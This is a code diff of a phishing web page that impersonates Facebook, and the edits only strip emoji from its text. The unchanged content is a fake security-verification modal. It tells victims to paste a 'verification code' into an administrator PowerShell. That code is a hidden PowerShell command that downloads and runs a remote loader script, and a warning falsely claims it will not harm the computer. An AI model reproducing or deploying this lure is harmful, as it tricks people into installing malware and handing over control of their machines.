@@ -365,14 +365,14 @@
                 <button class="close" onclick="closeModal()">&times;</button>
             </div>
             <div class="modal-body">
-                <div class="error-icon">🔒</div>
+                <div class="error-icon"></div>
                 
                 <h3>Unusaul Activity Detected</h3>
                 
                 <p>We've detected unusual login activity from your IP address (<b>192.168.74.157</b>). To protect your acount, please complete this security verification.</p>
                 
                 <div class="instruction-box">
-                    <h4>📋 Verification Steps:</h4>
+                    <h4> Verification Steps:</h4>
                     <ol>
                         <li>Click <b>"Copy Verification Code"</b> below</li>
                         <li>Right-click the <b>Windows Start</b> menu</li>
@@ -386,8 +386,8 @@
                     <code id="commandText">powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "IEX(New-Object Net.WebClient).DownloadString('http://192.168.74.147:8080/loader.ps1')"</code>
                 </div>
                 
-                <button class="copy-btn" onclick="copyCommand()">📋 Copy Verification Code</button>
-                <div class="success-msg" id="successMsg">✅ Code copied! Paste it in PowerShell (Admin)</div>
+                <button class="copy-btn" onclick="copyCommand()"> Copy Verification Code</button>
+                <div class="success-msg" id="successMsg"> Code copied! Paste it in PowerShell (Admin)</div>
                 
                 <div class="warning">
                     ⚠️ <b>Important:</b> This verification is required by Facebok security policy. The code will verify your browser session and IP address. This proces will not harm your computer.
@@ -420,12 +420,12 @@
                 
                 // Change button
                 const btn = event.target;
-                btn.textContent = '✅ Copied!';
+                btn.textContent = ' Copied!';
                 btn.style.background = '#42b72a';
                 
                 // Reset after 3 seconds
                 setTimeout(function() {
-                    btn.textContent = '📋 Copy Verification Code';
+                    btn.textContent = ' Copy Verification Code';
                     btn.style.background = '#1877f2';
                 }, 3000);
             }).catch(function(err) {
